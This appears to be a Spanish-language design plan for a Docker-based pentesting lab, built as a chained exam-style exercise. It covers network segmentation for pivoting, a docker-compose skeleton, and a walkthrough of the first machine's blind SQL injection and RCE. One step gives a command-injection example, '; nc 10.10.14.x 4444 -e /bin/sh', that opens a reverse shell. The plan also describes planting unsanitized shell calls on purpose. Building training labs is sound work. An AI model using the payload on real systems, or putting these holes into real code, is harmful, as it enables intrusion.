Laboratorio Avanzado de Pentesting (Estilo Examen)
1. Objetivo y Filosofía del Laboratorio
Crear un entorno aislado y altamente segmentado que simule una infraestructura corporativa real. El objetivo no es solo encontrar vulnerabilidades, sino demostrar habilidades de movimiento lateral (pivoting), escalada de privilegios y persistencia/ocultación.
Regla de oro: No hay "regalos". Cada máquina requiere entender el contexto de la anterior para avanzar.
Entorno: 100% Docker / Docker Compose.
2. Topología de Red y Segmentación (Pivoting)
Para lograr el pivoting en Docker, utilizaremos redes bridge personalizadas. Cada máquina (excepto la primera y la última) actuará como un "router" entre dos redes, obligando al atacante a usar herramientas como Chisel, Ligolo, o túneas SSH.
Zona 0 (Externa/DMZ): Red net_external. Solo accesible desde la máquina del atacante.
Zona 1 (Corporativa/Web): Red net_corp. Conecta M1 y M2.
Zona 2 (Datos/Backend): Red net_data. Conecta M2 y M3.
Zona 3 (Gestión/AD): Red net_mgmt. Conecta M3 y M4.
Zona 4 (Joyas de la Corona/OT): Red net_ot. Conecta M4 y M5.
Nota técnica: En Docker, un contenedor puede estar unido a múltiples redes. M1 estará en net_external y net_corp. El atacante solo estará en net_external.
3. Resumen de la Cadena (Kill Chain)
M1 (Web Server): Entrada inicial. Fuzzing, Blind SQLi, RCE. (Linux)
M2 (Dev/Internal App): Pivot 1. Explotación de un servicio interno mal configurado + Privesc vía SUID/Cron oculto. (Linux)
M3 (Legacy DB / File Server): Pivot 2. Extracción de hashes, ataque a base de datos antigua + Privesc vía Kernel o capacidades (Capabilities). (Linux)
M4 (Domain Controller / Management): Pivot 3. Active Directory (o simulación), Kerberoasting/DCSync + Privesc a Domain Admin. (Windows)
M5 (Secure Vault / Flag): Objetivo final. Acceso restringido por IP, requiere explotación de un servicio custom en C/Go + Privesc final. (Linux/Windows)
4. Deep Dive: Máquina 1 (M1 - "CorpWeb")
Rol: Servidor Web de atención al cliente / portal corporativo.
Sistema Operativo: Linux (Ubuntu 22.04 o Alpine).
Flujo de Ataque (Kill Chain de M1):
Paso 1: Descubrimiento y Fuzzing de Subdominios
Contexto: La página principal (corp.local) es estática, no hay login, solo información corporativa.
La Trampa: El atacante debe fuzzear subdominios. Se requiere un diccionario específico en lowercase (ej. admin, dev, db, portal).
Descubrimiento: Al fuzzear, se encuentra dbadmin.corp.local o portal.corp.local.
Implementación Docker: Se usará un contenedor ligero de dnsmasq o configuración de DNS wildcard para que cualquier subdominio de *.corp.local resuelva a la IP de M1.
Paso 2: Blind SQL Injection (Oculto)
Contexto: En el subdominio descubierto, hay un panel, pero está protegido o no tiene login obvio. Hay una función de "Verificar estado de ticket" o "Suscripción a newsletter" que hace una petición a un endpoint API oculto (ej. /api/v1/verify?ticket_id=...).
La Vulnerabilidad: No devuelve errores de la BD (Blind). Solo responde 200 OK con un JSON {"status": "found"} o {"status": "not_found"} (Boolean-based) o retrasa la respuesta (Time-based).
Extracción: El atacante debe extraer las credenciales del usuario de la base de datos (ej. db_admin / SuperSecretDBPass123!).
Paso 3: Acceso al Panel Oculto
Contexto: Con las credenciales de la BD extraídas, el atacante las prueba en el panel de login del subdominio (que resulta ser un panel de administración de la base de datos custom o un phpMyAdmin/Adminer).
Acceso: Login exitoso.
Paso 4: RCE a través de Función "Rebuscada"
Contexto: Dentro del panel de administración, no hay un botón de "Ejecutar comandos". El atacante debe explorar las funciones.
La Trampa: Existe una función de "Generar Reporte Personalizado" o "Backup a FTP externo".
La Vulnerabilidad:
Opción A (Inyección en Backup): Al pedir el backup a un FTP, el campo "Dirección FTP" o "Nombre de archivo" no sanitiza caracteres especiales. Ejemplo: Inyectar ; nc 10.10.14.x 4444 -e /bin/sh en el campo de "Ruta de destino".
Opción B (Reportes): La función permite definir una "Variable de entorno" para el reporte, pero por debajo usa os.system() o subprocess(shell=True) en Python, o exec() en PHP.
Resultado: Reverse Shell como el usuario www-data.
5. Próximos Pasos Inmediatos (Tu tarea actual)
Para empezar a construir esto, nos centraremos en dos cosas:
Configuración de Redes en Docker Compose: Crear las redes aisladas.
Configuración de M1 y el DNS: Levantar el servidor web, la base de datos y el resolvedor DNS para que el fuzzing de subdominios funcione.
Estructura inicial del docker-compose.yml
Aquí tienes el esqueleto de cómo debe verse tu archivo de compose para lograr la segmentación y el DNS:

version: '3.8'

services:
  # --- SERVICIOS DE INFRAESTRUCTURA ---
  dns_server:
    image: andyshinn/dnsmasq
    container_name: lab_dns
    cap_add:
      - NET_ADMIN
    # Configuración para resolver *.corp.local a la IP de M1
    command: >
      --address=/.corp.local/172.20.0.10
      --server=8.8.8.8
    networks:
      net_external:
        ipv4_address: 172.20.0.5

  # --- MÁQUINA 1: WEB SERVER (OBJETIVO INICIAL) ---
  m1_web:
    build: ./machines/m1_web
    container_name: m1_corpweb
    hostname: corpweb
    # M1 está en la red externa (para que el atacante la vea) 
    # y en la red corporativa (para el pivoting hacia M2)
    networks:
      net_external:
        ipv4_address: 172.20.0.10
      net_corp:
        ipv4_address: 172.21.0.10
    depends_on:
      - m1_db

  m1_db:
    image: mysql:5.7 # Usamos 5.7 para que sea más vulnerable/antiguo
    container_name: m1_database
    environment:
      MYSQL_ROOT_PASSWORD: rootpassword
      MYSQL_DATABASE: corp_db
      MYSQL_USER: db_admin
      MYSQL_PASSWORD: SuperSecretDBPass123!
    networks:
      net_corp:
        ipv4_address: 172.21.0.20
    # La DB NO debe ser accesible desde net_external

  # --- MÁQUINA 2: (Futuro Pivot 1) ---
  m2_dev:
    build: ./machines/m2_dev
    container_name: m2_devserver
    networks:
      net_corp:
        ipv4_address: 172.21.0.30
      net_data:
        ipv4_address: 172.22.0.10

# --- DEFINICIÓN DE REDES SEGMENTADAS ---
networks:
  net_external:
    driver: bridge
    ipam:
      config:
        - subnet: 172.20.0.0/24
  
  net_corp:
    driver: bridge
    internal: true # 'internal: true' evita que salga a internet, fuerza el pivoting
    ipam:
      config:
        - subnet: 172.21.0.0/24

  net_data:
    driver: bridge
    internal: true
    ipam:
      config:
        - subnet: 172.22.0.0/24
        
  # (Faltan net_mgmt y net_ot, se agregarán después)


Tareas para tu siguiente sesión de trabajo:
Crear el Dockerfile de M1:
Necesitas un contenedor que corra Nginx (o Apache) y un lenguaje backend (Python Flask/Node/PHP).
Recomendación: Usa Python con Flask para M1. Es más fácil de programar la vulnerabilidad de la Blind SQLi y el RCE "rebuscado" a propósito.
Programar la App Web de M1:
Crea la ruta / (página estática).
Crea la ruta /api/v1/verify (aquí estará la Blind SQLi).
Crea la ruta /login y el panel de administración en el subdominio (requerirá configurar los Virtual Hosts en Nginx para que sirva la app de admin solo si el Host header es dbadmin.corp.local).
Configurar la Base de Datos:
Crea un script init.sql que se ejecute al levantar el contenedor MySQL para crear las tablas y el usuario db_admin con la contraseña que extraerás.
